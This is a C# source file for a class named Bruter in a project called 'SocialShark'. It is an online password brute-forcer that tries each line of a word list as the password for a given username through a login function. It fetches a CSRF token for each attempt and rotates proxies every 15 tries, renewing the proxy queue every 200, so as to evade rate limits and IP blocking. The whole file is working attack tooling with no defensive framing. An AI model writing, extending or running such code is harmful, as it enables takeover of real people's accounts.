using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace SocialShark
{
    /// <summary>
    /// Class for handling and bruting
    /// </summary>
    public class Bruter
    {
        public static void Start(string username, string wordList)
        {
            string line;
            int proxyRefresh = 0;
            int proxyQueueRefresh = 0;
            string accntUser;
            string currentProxy;
            string authenticated = "FALSE";

            using (StreamReader file = new StreamReader(@"c:\text.txt"))
            {
                while ((line = file.ReadLine()) != null)
                {
                    // counters 
                    proxyRefresh++;
                    proxyQueueRefresh++;
                    var password = line;
                    accntUser = username;

                    // get proxy 
                    currentProxy = ProxySharp.Proxy.GetSingleProxy();
                    Console.WriteLine("[AUTHENTICATED]: " + authenticated);
                    Console.WriteLine("[PROXY]: " + currentProxy);
                    Console.WriteLine("[ACCOUNT]: " + accntUser);
                    Console.WriteLine("[PROXY REFRESH]: " + proxyRefresh);
                    Console.WriteLine("[PROXY QUEUE]: " + proxyQueueRefresh);
                    Console.WriteLine("[TRYING PASSWORD]: " + password);


                    if (proxyRefresh == 15)
                    {
                        ProxySharp.Proxy.PopProxy();
                        proxyRefresh = 0;
                    }

                    if (proxyQueueRefresh == 200)
                    {
                        ProxySharp.Proxy.RenewQueue();
                        proxyQueueRefresh = 0;
                    }

                    var csrf = Tokens.GetCSRFToken();
                    authenticated = Actions.Login(username, password, csrf);
                    Console.Clear();
                }

                file.Close();
            }
        }
    }
}
